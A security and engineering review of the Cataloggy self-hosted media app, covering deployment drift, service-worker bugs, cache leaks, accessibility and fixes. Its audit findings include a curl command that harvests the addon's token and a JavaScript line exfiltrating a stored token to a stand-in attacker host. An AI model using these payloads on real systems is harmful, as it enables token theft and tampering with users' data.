# Cataloggy — Six-Lens Application Review

**Date:** 2026-08-12 · **Commit reviewed:** `881669b` · **Scope:** whole repo (~56k LOC)

Six independent read-only reviews, each with a different lens: project management,
architecture, UI/UX, security, mobile/PWA, and frontend engineering. Findings below are
deduplicated across lenses; where two reviewers reached the same conclusion from
different directions that is noted, because independent convergence is the strongest
signal in this document.

Every claim in the "Verified" section was re-checked by hand against the source after
the reviews completed.

---

## Executive summary

Cataloggy is in better shape than its `0.1.0` version numbers suggest. There are zero
`TODO`/`FIXME`/`HACK` markers in the tree, zero `any`, zero `!` non-null assertions,
zero `@ts-ignore`, and zero `eslint-disable` across all four apps — a genuinely clean
sheet. `docs/api.md` matches the routing code down to the parameter level. Auth uses
SHA-256 + `timingSafeEqual`, every profile-scoped query filters on `profileId` (**no IDOR
exists** — all `:id` handlers were checked), the Trakt OAuth callback has real single-use
state, PINs use salted scrypt with escalating lockout, and there is a purpose-built
`lib/ssrf.ts` with DNS re-resolution at every user-URL sink. The design system in
`index.css` is coherent and deliberate. The mobile craft — `useVisualViewport`, iOS
scroll locking, a 16px input floor on coarse pointers, 46 generated splash screens — is
better than most commercial PWAs.

The problems cluster in three places, none of them in the API's core logic.

**1. Deployment drift is the dominant theme, and it disables shipped features.** Eight
environment variables that the README, `.env.example` and the troubleshooting guide all
instruct users to set are never forwarded into any container by `docker-compose.yml`.
Separately, the entire PWA layer is inert on the LAN-IP-over-HTTP deployment the README
walks users through, because that is not a secure context — and on the one documented
HTTPS path, the service worker's cache regex matches nothing. Two independent causes,
same result: the offline story does not exist in either supported deployment.

**2. The Stremio addon is the weak surface.** It is implemented twice (API + addon
service) with registries that have already drifted into user-visible bugs, it has no
authentication hook of any kind, and it discloses its own mutation token to
unauthenticated callers.

**3. The hand-rolled cache has a cross-profile leak.** `dataCache.ts` exports exactly the
right primitive to prevent it — `writeCacheForScope` — and the only caller that uses it
is the route prefetcher.

No finding is a remote-code-execution or full-compromise class issue. Overall security
verdict: **Moderate**, driven by the addon service and deployment drift rather than by
application logic.

---

## Verified findings

These were re-checked against source after the reviews completed. Each is confirmed.

| # | Finding | Evidence | Severity |
|---|---|---|---|
| V1 | Addon returns its mutation token to unauthenticated callers | `apps/addon/src/app.ts:815,824` — addon registers only a rate limiter (`:36`), no auth hook | High |
| V2 | Eight documented env vars never reach any container | `docker-compose.yml` — 0 occurrences each of `WEBHOOK_SECRET`, `WEBHOOK_ALLOWED_IPS`, `TRUST_PROXY`, `MAX_BODY_SIZE_MB`, `VAPID_SUBJECT`; all read in code | Critical |
| V3 | CSP `img-src ... https:` re-opens token exfiltration | `apps/web/serve.template.json:11`; no `form-action` either | Medium |
| V4 | Service worker API cache regex is root-anchored | `apps/web/src/sw.js:57-72` — `^/(...)$` vs the documented `/api/` proxy prefix | High |
| V5 | `writeCacheForScope` used only by the prefetcher | `apps/web/src/utils/dataCache.ts:58`; callers are `routePrefetch.ts` + tests only | High |
| V6 | `loadRecs` reads its race token without incrementing | `apps/web/src/pages/DashboardPage.tsx:912` — `const token = recsToken.current` vs `++` at `:874,890,967` | Medium |
| V7 | Search page renders nothing during first search | `SearchPage.tsx:521,534,575` — all three branches false while `isSearching && !hasSearched` | High |
| V8 | Mutation origin guard passes on absent `Origin` | `apps/addon/src/app.ts:879-882` — `if (!origin) return true` | High |

---

## Critical

### C1 — Documented env vars are never passed into any container
*Found independently by the Project Manager and Security lenses.*

`docker-compose.yml` has no `env_file:` directive and no `${WEBHOOK_SECRET}`-style
substitution. Compose substitutes `.env` into the compose file itself; it does not forward
values into containers. Missing from the `api` service's `environment:` block
(`docker-compose.yml:80-113`):

| Variable | Documented at | Read at |
|---|---|---|
| `WEBHOOK_SECRET` | `.env.example:113`, `README.md:388`, `docs/troubleshooting.md:45` | `lib/webhook-auth.ts:4` |
| `WEBHOOK_ALLOWED_IPS` | `.env.example:122`, `README.md:388` | `lib/webhook-auth.ts:6` |
| `TRUST_PROXY` | `README.md:388`, `docs/troubleshooting.md:121` | `api/src/index.ts:109`, `addon/src/app.ts:29` |
| `MAX_BODY_SIZE_MB` | `.env.example:138`, `docs/api.md:101` | `api/src/index.ts:98` |
| `VAPID_SUBJECT` | `.env.example:142` | `lib/push.ts:6` |
| `NOTIFICATION_CHECK_INTERVAL_SEC` | `docs/troubleshooting.md:265` | `api/src/index.ts:75` |
| `PROXY_PATH_PREFIXES` | nowhere | `api/src/index.ts:96` |
| `LOG_LEVEL` | nowhere | `addon/src/app.ts:28` |

The failure loop closes perfectly: a user sets `WEBHOOK_SECRET` per `.env.example:113`,
configures Plex, gets silence, and `docs/troubleshooting.md:48` tells them to set the
thing they already set. The Plex/Jellyfin webhook feature — a headline README bullet — is
unreachable on the documented install path.

The security consequence is separate and additive: `WEBHOOK_ALLOWED_IPS` (the documented
defence-in-depth for exposed webhooks) cannot be enabled, and without `TRUST_PROXY`,
`parseTrustProxy` returns `undefined` (`packages/shared/src/proxy.ts:38-39`) so every
client behind a reverse proxy shares one rate-limit key — one noisy client exhausts the
200/min budget for the whole household.

**Fix:** add all eight to the `environment:` blocks using the `${VAR:-default}` form
already used for `TMDB_API_KEY` at `docker-compose.yml:104-110`. Add `TRUST_PROXY` to
`.env.example`. Then add a CI check that greps every `process.env.X` in `apps/*/src`
against the compose file — this class of bug recurs otherwise.

---

## High

### H1 — The addon discloses its mutation token to unauthenticated callers
*Security lens. CWE-200/522.*

`apps/addon/src/app.ts:791` registers `/subtitles/:type/:id.json` with no authentication —
the addon service registers only a rate limiter (`:36-41`), no token gate anywhere. That
handler embeds the mutation token into the URLs it returns (`:815`, `:824`, `:837`). The
mutation guard is `isValidMutationToken(query.token) || isAllowedMutationOrigin(request)`,
and the origin half returns `true` when no `Origin` header is present (`:879-882`) — curl
sends none.

The addon's own test suite documents the disclosure (`app.test.ts:169-174`).

**Attack:** `curl http://host:7001/subtitles/movie/tt0111161.json`, read the token from
the response, then write watch events and scrobbles into any profile whose UUID is known.
This contradicts `README.md:385`, which credits this token with protecting addon writes.
The token is HMAC-derived, so `API_TOKEN` itself is not recoverable — impact is integrity
of watch history (and onward pollution of a linked Trakt account), not full compromise.
The addon's *read* exposure is separately documented as accepted risk; only the write
bypass is novel.

**Fix:** mint a per-item capability instead — `HMAC(API_TOKEN, "mark-watched:" +
profileId + ":" + itemId + ":" + expiry)` with a short expiry — so a leaked URL only
re-marks the one title it was minted for.

### H2 — The PWA layer is inert on the deployment the README documents
*Mobile lens.*

Service workers, `Notification` and `PushManager` require a secure context.
`http://192.168.x.x:7002` — the README quickstart (`README.md:133-150`, `docker-compose.yml:178`)
— is not one. On that deployment:

- `registerSW()` (`UpdatePrompt.tsx:19`) fails silently; no `onRegisterError` is passed, so
  nothing is logged or surfaced.
- `beforeinstallprompt` never fires, so `InstallButton.tsx:100` hides the install button
  entirely on Android. Android users get no install path from the UI.
- `PushSettings.tsx:64` says "Push notifications aren't supported in **this browser**" —
  blaming Chrome for an origin problem.
- `OfflineBanner.tsx:35` promises "showing saved data"; there is none.
- `docs/troubleshooting.md:139` claims the SW caches posters — false here.

iOS is the confusing exception: Add to Home Screen over HTTP does honour
`display: standalone`, so iOS users get a chrome-less app with no offline and no push.

`docs/troubleshooting.md:237-243` explains this correctly but frames it as
notifications-only rather than "the entire PWA layer is off."

**Fix:** an HTTPS callout at `README.md:147` pointing at the reverse-proxy section; pass
`onRegisterError` and log it; branch the `PushSettings` copy on
`window.isSecureContext === false`.

### H3 — The service worker's API cache matches nothing behind the documented proxy
*Mobile lens.*

`apps/web/src/sw.js:57-72` builds `^/(watchlist|continue|recent|...)$` and matches it
against `url.pathname` (`:114`). `README.md:316` documents the only HTTPS deployment as
Nginx Proxy Manager with `/api/` → port 7000, making pathnames `/api/watchlist` etc. None
match.

So the two documented deployments are: HTTP LAN (SW never runs — H2) and HTTPS proxy (SW
runs, API cache matches zero requests). The `api-runtime-v1` cache, the profile-partitioned
cache-key plugin (`:83-97`) and the `INVALIDATE_API_CACHE` messaging (`:139-147`) are all
dead in practice. Posters still cache (matched by hostname, `:35-36`), so an offline phone
shows posters over empty sections — arguably worse than an honest offline page.

There is also **no navigation fallback**: `sw.js:8` is `precacheAndRoute` only, with no
`NavigationRoute`. Since `injectManifest` is used (`vite.config.ts:61`), vite-plugin-pwa
does not generate one. Offline, the app works only if launched from the home screen and
never reloaded; any reload on `/lists` or `/search` gets the browser's error page.

**Fix:** derive the match from the configured API base rather than assuming root; add
`registerRoute(new NavigationRoute(createHandlerBoundToURL("/index.html")))`. `sw.js`
currently has no test file — add one.

### H4 — Cross-profile data leak in the client cache
*Frontend lens.*

`useCachedState.ts:70-79` writes through the unscoped `writeCache`. `dataCache.ts:58-61`
exports `writeCacheForScope` for exactly this hazard, and the only caller is
`routePrefetch.ts`.

`runtimeConfig.setProfileId` (`api.ts:91-105`) calls `applyCacheScope()` synchronously and
`App.tsx:340` re-keys `<Routes>` so pages remount on a profile switch. But
`DashboardPage.load` (`:841-852`) issues five requests with no `AbortController`.
**Failure:** the adult profile's dashboard is loading; the user switches to the kid
profile; the old `Promise.all` resolves and `writeCache("dash:progress", …)` executes
under the *kid's* scope. The freshly mounted dashboard is subscribed to that key and
paints the adult profile's Continue Watching. Same path in `StatsPage.tsx:59-72`,
`HistoryPage.tsx:93-112`, `ListsPage.tsx:354-368`.

Related (`useCachedState.ts:83-90`): subscriptions are keyed to the scope at subscribe
time and never re-subscribe on scope change, so a component that stays mounted across a
switch both keeps rendering the old identity's data and goes permanently deaf to
invalidations.

**Fix:** route `setAndCache` through `writeCacheForScope`; give page loaders an
`AbortController` cancelled on unmount, as `useDetailPanel.ts` already does.

### H5 — The Stremio addon protocol is implemented twice and has already drifted
*Architecture lens.*

Both `apps/api/src/routes/stremio.ts` and `apps/addon/src/app.ts` build a manifest, serve
catalogs, and read the same per-profile KV config — and they disagree about its contents:

- `ALL_ADDON_CATALOGS` (`lib/addon.ts:18`) and the settings UI offer
  `cataloggy-ai-movie`/`cataloggy-ai-series`. The addon's `DISCOVERY_CATALOGS`
  (`app.ts:314-333`) has no such entries, so the filter at `:430-432` drops them.
  **Enabling "AI Picks" in Settings produces nothing.**
- The API honours `list:<uuid>` entries (`stremio.ts:345-358`); the addon builds list
  catalogs from *every* list unconditionally (`app.ts:398-417`). **Disabling a list in
  Settings does not remove it from the addon.**
- The two manifests declare different ids, resources and profile-binding schemes.

**Fix:** move the catalog registry into `packages/shared` as one typed const both
manifests derive from. Longer term, delete one implementation — the API's
`resources: ["catalog"]` manifest is a strict subset.

### H6 — Scheduled jobs can overlap themselves
*Found independently by the Architecture and Frontend lenses.*

Every scheduler in `apps/api/src/index.ts:294-429` is a bare
`setInterval(() => { void job() }, N)` with no in-flight tracking. `pollTraktHistory` on a
first-run backfill fetches up to 500 pages and issues 2-3 sequential Prisma round trips per
entry (`lib/trakt-client.ts:473-497`), comfortably exceeding the 300s poll interval on a
large account. The dedup is a read-then-write with no unique constraint on the non-Trakt
path, so two concurrent passes both see "no existing event" and both create — **duplicated
watch history**.

A correct fix for this exact class already exists at `lib/stremio-library.ts:146-153` — it
was applied locally instead of to the scheduler.

Related: `Number(process.env.X ?? default)` at `index.ts:60-75` yields `NaN` on a typo, and
`NaN > 0` is false, so the job silently disables itself while logging "is set to 0".
`parseSteamSyncIntervalSec` (`:83-92`) does this correctly and should be reused.

**Fix:** hoist `withSyncLock` into `lib/scheduler.ts` and route all eight jobs through it.

### H7 — The search page shows nothing while its first search runs
*UI/UX lens.*

`SearchPage.tsx`'s three content branches are `!hasSearched && !isSearching` (:521),
`noResults` (:534, requires `hasSearched`), and the results grid (:575, requires
`hasSearched`). During the first search `rawResults` is `null` and `isSearching` is `true`,
so **all three are false** — the content region is empty. The only feedback is a 16px
spinner in the filter row.

Every other async surface has a skeleton: `ListsPage.tsx:781`, `GamesPage.tsx:437`,
`CalendarPage.tsx:345`, `HistoryPage.tsx:272`, `StatsPage.tsx:98`. The app's most-used flow
is the one that looks broken while it works. On re-search, stale results are shown as
current with no indication.

**Fix:** render a poster-grid skeleton when `isSearching && !hasSearched`; dim the stale
grid on re-search.

### H8 — No releases or tags, while three documents tell users to pin a version
*Project management lens.*

Zero git tags, zero GitHub releases. Yet `docker-compose.yml:1-12`, `.env.example:22-25`,
`README.md:78-88` and the migration-recovery procedure at `README.md:370-373` all depend on
rolling back to a semver tag. `dockerpublish.yml:9` has a dormant `v*` trigger with semver
logic at `:78-92` that has never executed. The bug-report template asks for a version;
the only answerable values are `latest` or a 12-char sha.

Consequence: everyone is on `:latest`, and ~15 real security fixes sit unnamed in a 97 KB
`[Unreleased]` changelog block (`CHANGELOG.md:107-130`) with no way for a user to answer
"does my build have the profile-PIN fix?"

**Fix:** cut `v0.1.0` from current main — it exercises the dormant semver path — and close
the changelog block into a dated version.

### H9 — The publish workflow can ship images CI never validated
*Project management lens.*

`dockerpublish.yml` runs its own `test` job (`:16-52`) with **no Postgres service and no
migration step**, unlike `ci.yml:14-27,58-62`. Both trigger on push to main and are fully
independent; nothing makes `build-and-push` wait on `ci.yml`.

`ci.yml:58-62` exists specifically so "a broken migration fails CI instead of stopping a
self-hoster's update." That guarantee does not extend to the images users actually pull. A
migration that fails `prisma migrate deploy` red-Xes `ci.yml` while `dockerpublish.yml`
pushes `:latest` — and `docker-compose.yml:119-120` makes `api` wait on `migrate`
succeeding, so those users get an API that never starts.

**Fix:** gate `build-and-push` on `ci.yml` via `workflow_run`, or copy the Postgres service
and migration step across. The duplication is the root cause; the two jobs have drifted once
already.

---

## Medium

### M1 — CSP `img-src https:` re-opens token exfiltration
`apps/web/serve.template.json:11`. `apps/web/scripts/csp.mjs:1-11` states the purpose:
the old wildcard `connect-src` "defeats the exfiltration protection the README's Security
section credits the CSP with providing for the localStorage-token tradeoff."
`README.md:381` repeats that claim. But `img-src 'self' data: https:` is a wildcard —
injected script does `new Image().src = "https://attacker/?t=" + localStorage.cataloggy_token`
and the token leaves the origin. There is also no `form-action` directive, and `default-src`
does not cover it. **Fix:** build `img-src` from the `IMAGE_CDN_ORIGINS` that `csp.mjs:54`
already imports for `connect-src`; add `form-action 'self'`.

### M2 — No request-validation layer across 133 endpoints
No zod, typebox or Fastify JSON schemas anywhere. `POST /watch` spends 68 lines on
hand-written `typeof` checks (`routes/watch.ts:34-102`); every route reimplements the same
idioms differently. Validation drift is invisible — `PATCH /watch/:eventId` accepts an
unbounded `note` while `POST /watch` trims it. `POST /checkin` (`routes/scrobble.ts:75-90`)
has **no runtime validation at all**, so a non-string `name` reaches Prisma as a 500 and a
32 MB body parks an oversized row per profile. Three notification routes
(`routes/notifications.ts:129,171,186`) lack the `UUID_V4_PATTERN` guard their siblings
have — `routes/tags.ts:52-55` documents exactly why it matters. No `response` schemas
either, so Fastify falls back to generic `JSON.stringify`.

### M3 — ESLint has no React plugins and no type-aware rules
*Found independently by the Project Management and Frontend lenses.*
`eslint.config.mjs` is `js.configs.recommended` + `tseslint.configs.recommended` only. No
`eslint-plugin-react-hooks` across 154 `useEffect` sites, no `jsx-a11y` for a React app that
just had a hand-done WCAG pass, and `recommended` rather than `recommendedTypeChecked` — so
`no-floating-promises` is off in a codebase that leans on `void promise`. This is *why*
several findings here exist: `ListsPage.tsx:395-399` (missing dep, recreated every render),
`StatsPage.tsx:59-72` (`[]` deps while closing over setters), `DashboardPage.tsx:867`
(`profileId` read during render, used as a dep). Separately, every lint script is
`eslint src`, so `scripts/`, `apps/web/scripts/csp.mjs` and `eslint.config.mjs` itself are
never linted — making the `**/*.{js,mjs}` block at `eslint.config.mjs:7-16` dead config.

### M4 — Race conditions in three search/pagination paths
- **`loadRecs` reads its token without incrementing** (`DashboardPage.tsx:912`; siblings at
  `:874,890,967` all use `++`). Both the original and the Retry request pass the guard, so a
  late failure replaces good recommendations with an error card.
- **CommandPalette search has no abort and no request-id** (`CommandPalette.tsx:80-103`);
  cleanup cancels the timer only. `api.search` accepts a signal and both other call sites
  use it. Type `dun` → `dune` and the slower first round-trip lands last.
- **`HistoryPage.loadMore` has no staleness guard** (`:114-125`) while its reset effect does;
  changing the filter mid-fetch appends the previous filter's rows and desyncs `offset`.
- **`ListsPage.loadItems`** (`:370-381`) has no abort or request-id — fast list switching
  leaves the slowest response displayed under the wrong header, and a subsequent delete
  targets the displayed list for an item not in it.

### M5 — `HistoryPage` caches server-filtered results under the unfiltered key
`HistoryPage.tsx:63` keys on `"history:events"` while `:83-89` sends a `type` filter, and
the prefetcher writes unfiltered data to the same key (`routePrefetch.ts:63-65`). Filter to
Movies, navigate away, come back: the page mounts with `typeFilter = "all"`, reads the
movies-only cache, and paints it as complete history — with the skeleton suppressed by
`meta.hadCachedValue`. `CalendarPage.tsx:197-200` solves the identical problem correctly.

### M6 — Detail-bundle cache is not profile-partitioned
`useDetailPanel.ts:20-21` is a module-level `Map` untouched by `purgeApiCache`,
`setCacheScope`, or the SW's partitioned keys. `DetailBundle.dropped` is per-profile state.
Profile A drops a show, switches to B within 60s, opens the title — B sees "Dropped" and an
Undrop button that writes to B's data.

### M7 — TMDB fans out N+1 requests with no retry or 429 handling
Seven methods in `tmdb.ts` share the shape "fetch 20 results, then `Promise.all` a
per-result `getImdbId()`" — 21 concurrent requests per catalog render on a cold cache, and
`stremio.ts:301-303` notes a single Stremio refresh can be 25+ catalogs.
`TmdbClient.request` (`:637-660`) has a 10s timeout and nothing else. Meanwhile `steam.ts:46-62`
implements exponential backoff and `igdb.ts:194-207` has a real rate limiter — three
integrations, three reliability postures. **Fix:** one `lib/http.ts` behind all of them; at
minimum route the fan-out through the existing `mapWithConcurrency`.

### M8 — `GET /lists/:listId/items` is unpaginated and refetched uncached per catalog
`routes/lists.ts:289-302` returns every item with joined metadata, no `take`, no cursor. The
addon calls it per catalog request with no cache (`app.ts:499-502`), filters movie/series
client-side (`:504-514`) so half of every payload is discarded, and sorts in Node — a
3-list install re-sorts a 5000-item watchlist six times per home-screen refresh.

### M9 — Accessibility gaps the WCAG pass missed
The pass was real work — shared `useFocusTrap`/`useScrollLock`/`useEscapeKey`, a correct
`aria-activedescendant` combobox, real table semantics on the calendar. What it missed
clusters in call sites that bypass the token system:

- **Two measured AA failures.** `SearchPage.tsx:597` renders the active sort pill as white
  on `--text-dim` — **1.91:1 on glass, 2.27:1 on dark, 2.41:1 midnight**. `CalendarPage.tsx:511`
  uses `--accent` as body text (2.68:1 light, 4.21:1 midnight) where `index.css:10-13`
  explicitly documents `--accent-text` as the token for that job.
- **`MoreSheet` declares `aria-modal="true"` with no focus trap and no scroll lock**
  (`MobileTabBar.tsx:139-199`) — the only overlay in the app missing both, on the nav surface
  for four of eight mobile destinations. *(Found independently by the UI and Mobile lenses.)*
- **`aria-pressed` missing from five toggle groups** (`SearchPage.tsx:373,588`,
  `HistoryPage.tsx:248`, `GamesPage.tsx:421`, `SettingsPage.tsx:265`) while present on six
  others — active filter state is colour-only (SC 1.4.1, 4.1.2).
- **`ListsSection.tsx:159-233` ships the `role="menu"`-with-a-textbox anti-pattern** that
  `SearchPage.tsx:873-881` carries a comment explaining why it avoided.
- **Nested interactive controls** — a real `<button>` inside a `role="button"` div
  (`SearchPage.tsx:786+842`, `GamesPage.tsx:226`); `HistoryPage.tsx:330-339` documents the
  refactor away from this shape that the other two never got.
- **Focus dropped on two transitions**: the Lists delete-confirm swap (`ListsPage.tsx:569,624`)
  and the detail-panel recommendation swap (`DetailPanel.tsx:519-523`, which also keeps the
  previous title's `scrollTop`, landing you at the bottom of the new panel).
- **Heading order skips h1→h3** (`DashboardPage.tsx:1155`); the check-in hero (`:1090-1124`)
  is the page's visual h1 with no heading at all.
- **No overlay applies `inert`/`aria-hidden` to the background** — all eight share
  `useFocusTrap`, so this is one central fix.

### M10 — No test touches a real database
All 39 API test files mock Prisma; `ci.yml` starts Postgres only to run `migrate deploy`. The
schema carries semantics mocks cannot express: singleton constraints, the watch-event dedup
index, cascade deletes. The most recent commit in history is about the API "minting a second
watchlist it would then refuse to delete" — exactly what a mocked Prisma cannot catch. CI
already has a migrated Postgres; an integration suite for list singletons, watch dedup,
profile cascade, series-progress rewind and the export/import round trip is cheap from here.

Related: `packages/shared` has **no `test` script at all**, so the root `pnpm -r --if-present test`
silently skips it — including `proxy.ts`, which decides whether `X-Forwarded-For` is trusted.

### M11 — Manifest gaps and a theme-colour mismatch
`vite.config.ts:72-92` declares only name/short_name/start_url/display/colors/icons. Missing
`id` (so a future `start_url` change orphans every installed icon), `scope`, `description`,
`screenshots` (costing the rich Android install dialog), and `shortcuts` (five obvious
candidates already enumerated in `MobileTabBar.tsx:25-37`). Manifest `theme_color` is
`#d97742` **orange** while `index.html:6` sets cream and `theme-init.js:41` rewrites it per
theme — so an installed Android app launches into a black splash, then a cream app under an
orange status bar. None of the five themes is orange-topped. The 512 icon is declared
`"any maskable"` but padded to `fill: 0.62` for the maskable safe zone, so it renders
undersized wherever it's used as `"any"`.

### M12 — API responses are typed but never validated
`api.ts:766` is `response.json() as Promise<T>` across ~90 methods. The types are load-bearing
lies at a boundary where version skew is expected by design (staggered self-hosted upgrades).
An older API omitting `airDate` produces `entry.airDate.split` → `TypeError` inside a `.map`
(`CalendarPage.tsx:42`), which unmounts the whole app via the single global `ErrorBoundary`
rather than degrading the calendar.

### M13 — One global error boundary that cannot recover
`main.tsx:22-31` wraps `BrowserRouter`, so any render error blanks the entire app — header,
sidebar, tab bar included — and `resetErrorBoundary` re-renders the route that just threw,
which throws again. **Fix:** a second boundary inside `<main>` keyed on `location.pathname`.

---

## Low

- **`request()` awaits SW invalidation in `finally`** (`api.ts:699-713`) — every mutation,
  including failed ones, blocks up to 1s (`:603`) before the caller resumes. And
  `invalidateMemoryCache()` is `invalidateAll()`, so rating one episode discards the
  dashboard's, lists', calendar's and stats' cached rows — the exact cost `useCachedState`
  exists to remove. Fire-and-forget it, and invalidate by prefix.
- **`handleMarkNext` leaves an uncancelled 1.2s timer** (`DashboardPage.tsx:1003-1019`) that
  fires a five-request reload after unmount, whose responses then hit the H4 cache path.
- **Toast context value is a fresh object every provider render** (`useToast.tsx:264`) —
  every consumer re-renders 3-4× per toast, including a 20-card search grid.
  `useProfile.tsx:35-38` gets this right.
- **Toast stack overlaps the tab bar on notched iPhones** (`useToast.tsx:74` — `max-sm:bottom-20`
  with no safe-area term, vs ~102px of tab bar). `UpdatePrompt.tsx:43` has the correct
  expression and a comment saying it matches ToastContainer; they drifted. Undo becomes
  untappable.
- **Sub-44px tap targets** on the carousel arrows (32×32, `DashboardPage.tsx:425,435`) and the
  detail-panel close button (36×36, `DetailPanel.tsx:320`) — the only way out of a full-screen
  panel on mobile. The codebase knows the rule (`MobileTabBar.tsx:187` uses `min-h-11`).
- **Pull-to-refresh is live in browser tabs** (`index.css:373-384` scopes
  `overscroll-behavior: none` to standalone only) and fights the horizontal carousels — and
  per H3, that reload white-screens offline on any route but `/`. Moving
  `overscroll-behavior-y: contain` to unconditional suppresses it without touching pinch-zoom,
  so the WCAG 1.4.4 reasoning at `displayMode.ts:160-177` is unaffected.
- **Push UX misreports why it's unavailable** — iOS requires an installed PWA and nothing says
  so; a previously-denied permission resolves instantly with a message offering no recovery
  path (`push.ts:28-30`, `PushSettings.tsx:63-65`).
- **Addon writes its mutation token to its own logs** — the API has a redacting serializer
  (`index.ts:100-107`); the addon does not (`app.ts:27-31`), and compose retains 10 MB × 3 of
  those logs per service.
- **`GET /rpdb/config` returns the RPDB key in cleartext** (`routes/settings.ts:226-229`) while
  every sibling key endpoint is deliberately write-only. Gate it on the existing
  `matchesServiceToken`.
- **SSRF status/error oracle** — the SSRF policy deliberately permits LAN targets (documented
  reasoning, `lib/ssrf.ts:1-19`), and both sinks suppress response bodies, but raw status codes
  and socket errors (`connect ECONNREFUSED 10.0.0.5:22`) still surface, turning the API into an
  internal port scanner for anyone holding the token — notably an XSS'd tab that otherwise
  can't reach the LAN.
- **Health check doesn't check the database** (`routes/health.ts:4`) while compose uses it as
  the container healthcheck — an API with an exhausted pool reports healthy and keeps taking
  traffic. No metrics endpoint of any kind.
- **No Prisma pool or statement-timeout configuration** (`lib/prisma.ts:1-5` is five lines), with
  two heavy CTEs at `routes/watch.ts:295-368` and a backfill issuing thousands of sequential
  queries.
- **Schema nits**: mixed `Timestamp(6)`/`Timestamptz(6)` compared against JS `Date`s; `ListItem`
  and `Metadata` have no primary key (blocking logical replication); `Rating.@@index([profileId])`
  is redundant with the composite PK.
- **Clock-derived labels frozen at mount** outside the dashboard (`CalendarPage.tsx:178`,
  `HistoryPage.tsx:227`) — a tab left open overnight labels yesterday "Today".
  `useClockBoundary` (`DashboardPage.tsx:612-651`) solves this properly and just isn't shared.
- **`pnpm smoke` — README step 3 — cannot authenticate.** `scripts/smoke.ts:1-3` defaults
  `API_TOKEN` to `"dev-token"` and nothing loads `.env`, so a Compose user (who is *required* to
  set a real token) watches the token-bearing checks 401 at the moment they're verifying the
  install.
- **`docker compose up --build` is documented** (`README.md:89`) but no service declares `build:`.
- **Games is a permanently empty nav item** without a Twitch app, and `routes/games.ts:53` returns
  **500** for what is a configuration state — wrong status, and it reads as a server fault in
  Sentry.
- **`ALLOWED_HOSTS` is inert in the production image** — read only by `vite.config.ts:9` for the
  dev/preview servers, while production runs `serve -s dist`, which has no host-allowlist feature.
- **Four dialogs skip the exit-animation grammar** `index.css:1004-1006` documents
  (`ListsPage.tsx:185`, `GamesPage.tsx:127`, `CalendarPage.tsx:127`, `ProfileSwitcher.tsx:26`) —
  200ms in, 0ms out.
- **Two modals skip `useVisualViewport`** (`WatchDateModal`, `CheckInModal`) — the number and date
  inputs sit under the iOS keyboard, the exact bug commit `ef2e068` fixed for the others.
- **Missing `SECURITY.md`** (so GitHub doesn't surface "Report a vulnerability" despite
  `CONTRIBUTING.md:36` directing reporters there), **no PR template**, **no CODEOWNERS**.
- **`packages/migrate` is load-bearing and absent from both structure diagrams.**
- **Pinned-action SHA comments have drifted** — `security.yml:48` and `ci.yml:36` pin the same SHA
  commented `v6.0.9` and `v6.0.10`.

---

## What's genuinely good

Worth recording, because it's unusual and it should survive future refactors:

- **Zero suppressions.** No `any`, `!`, `as any`, `@ts-ignore`, `@ts-expect-error`, or
  `eslint-disable` in any of the four apps. The `as` casts that exist are validated immediately
  after (`useSearchFilters.ts:53-63`) or are CSS-custom-property escapes.
- **No IDOR.** Every `:id` route handler filters on `profileId`. This was checked exhaustively.
- **Auth primitives are correct**: SHA-256 + `timingSafeEqual`, single-use OAuth state, salted
  scrypt PINs with escalating lockout, HMAC-derived service tokens that let the API rate-limit
  the addon separately from browsers.
- **A real SSRF module** (`lib/ssrf.ts`) with DNS re-resolution and `redirect: "error"` at every
  user-URL sink, with the LAN-permit decision documented rather than accidental.
- **Raw SQL is exclusively `Prisma.sql` tagged templates.** No string interpolation anywhere.
- **Container and CI posture**: digest-pinned non-root Dockerfiles, SHA-pinned actions,
  `persist-credentials: false`, no `pull_request_target`, Postgres bound to `127.0.0.1`.
- **The HTTP caching tier design** (`lib/http-cache.ts`) computes ETags before compression and
  splits metadata from revalidate tiers — genuinely careful work.
- **Single-flight guards** in `lib/coalesce.ts`, `lib/profile.ts`, and IGDB's `pendingToken`.
- **The design system** in `index.css`: five themes from one token set, three elevation tiers
  mapped to three radius ranks, and an `--on-accent`/`--accent-text` split that solves a contrast
  problem most apps never notice.
- **Mobile craft**: `useVisualViewport`, iOS-aware scroll locking, a 16px input floor under
  `pointer: coarse`, 46 generated splash screens, srcset down to w92, save-data-aware prefetch.
- **`docs/api.md` is accurate** down to the parameter level.
- **Comments explain *why*.** Several document bugs already found and fixed. Where a reviewer
  here found a problem, the codebase had often already reasoned about the same class of problem
  correctly somewhere else — the gap is consistently *propagation*, not understanding.

---

## Recommended order of work

**First — things that are broken for users right now**

1. Wire the eight env vars into `docker-compose.yml`, add `TRUST_PROXY` to `.env.example`, and add
   the CI grep that keeps them in sync. *(C1)*
2. Fix the SW API cache regex and add the SPA navigation fallback — ~8 lines that turn a
   completely dead offline layer into a working one. *(H3)*
3. Unify the Stremio catalog registry in `packages/shared` — fixes two live user-visible bugs.
   *(H5)*
4. Add the search-results skeleton. *(H7)*

**Second — security**

5. Stop emitting `MUTATION_TOKEN` from the unauthenticated `/subtitles` route; mint a per-item
   capability instead. *(H1)*
6. Tighten `img-src` to the CDN origins `csp.mjs` already imports, and add `form-action 'self'`.
   *(M1)*
7. Give the addon the API's redacting log serializer; gate `/rpdb/config` on the service token.

**Third — correctness**

8. Route `useCachedState` writes through `writeCacheForScope` and abort page loads on unmount.
   *(H4)*
9. Add the scheduler overlap guard. *(H6)*
10. `const token = ++recsToken.current;` — one character. *(M4)*

**Fourth — the gates that stop this recurring**

11. Add `eslint-plugin-react-hooks` and `jsx-a11y`; move the Node apps to
    `recommendedTypeChecked`. Several findings above become CI failures instead of review
    findings. *(M3)*
12. Add integration tests against the Postgres CI already starts; add a `test` script to
    `packages/shared`. *(M10)*
13. Cut `v0.1.0`, close the changelog block, and gate `dockerpublish.yml` on `ci.yml`.
    *(H8, H9)*

The through-line: this project's problems are almost never "the author didn't know." The
knowledge is usually present in a comment, a helper, or a sibling module — it just didn't
propagate to the second call site. Items 11-13 are the ones that change that.
